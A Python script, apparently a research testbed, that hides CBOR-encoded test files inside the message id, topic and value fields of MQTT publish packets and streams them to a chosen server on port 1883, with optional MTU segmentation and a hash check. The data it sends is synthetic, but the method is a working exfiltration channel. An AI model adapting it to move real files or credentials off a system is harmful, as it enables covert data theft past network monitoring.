from cbor2 import dumps, loads
import socket
import scapy.contrib.mqtt as mqtt
from scapy.all import IP, TCP, RandShort, send, sr1, load_contrib
import argparse, sys, ipaddress
from util.cborctl import CBORIterator, readFromFile
from hashlib import sha256


parser = argparse.ArgumentParser()
parser.add_argument("-l", "--Length", type=int, help = "Length of data to exfiltrate (500 KB, 1, 5, 10 MB)")
parser.add_argument("-s", "--Segment", action="store_true", help = "Segement packets into Ethernet MTU sizes")
parser.add_argument("-t", "--Target", help = "IP address of server to send exfiltration data to")
args = parser.parse_args()

# SEG
#   -> True: Packetgröße auf MTU limitieren
#   -> False: Beliebige Packetgröße (ein Packet mit vollständigem Payload)
SEG = False
if args.Segment == True: SEG = True

size = int(args.Length)
if size not in [1,5,10,500]:
    print("Invalid exfiltration size!")
    sys.exit(1)

SERVER_IP = ""
try:
    ipaddress.ip_address(args.Target)
except ValueError:
    print("Invalid target server address!")
    sys.exit(1)

SERVER_IP = args.Target
PSIZE = 1455

print("\n====================MQTT EXFILTRATION====================\n")

info = "ON" if SEG else "OFF"
print(f"Exfiltrating {size} MB with Segementing {info}")

if size == 500:
    content = readFromFile("data_05mb.json")
else:
    content = readFromFile(f"data_{size}mb.json")    # bytes von CBOR speichern

print("Hash of CBOR-encoded content:\n" + sha256(content).hexdigest() + " (Check at receiver!)")
print("Length of payload bytestream: " + str(len(content)) + "\n")
crwaler =  CBORIterator(content)


# Socket TCP-Verbindung aufbauen
packet_counter = 0
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, 1883))  # Verbinden

    print("START sending packets")
    while crwaler.getRemainingLength() >= PSIZE and SEG:    # Payload aufteilen
        packet = mqtt.MQTT(QOS=1)/mqtt.MQTTPublish(msgid=int.from_bytes(crwaler.getNextBytes(2), "big"), topic=crwaler.getNextBytes(14), value=crwaler.getNextBytes(1439))  # MQTT Packet erstellen
        s.send(bytes(packet))
        packet_counter += 1
    
    packet = mqtt.MQTT(QOS=1)/mqtt.MQTTPublish(msgid=int.from_bytes(crwaler.getNextBytes(2), "big"), topic=crwaler.getNextBytes(14), value=crwaler.getRemainingBytes())     # restliche bytes senden
    s.send(bytes(packet))
    print("FINISHED sending packets")
#    print("Last packet sent: ")
#    packet.show()
    packet_counter += 1
    print("Length of last packet: " + str(len(packet)))

    print("Packets sent: " + str(packet_counter))
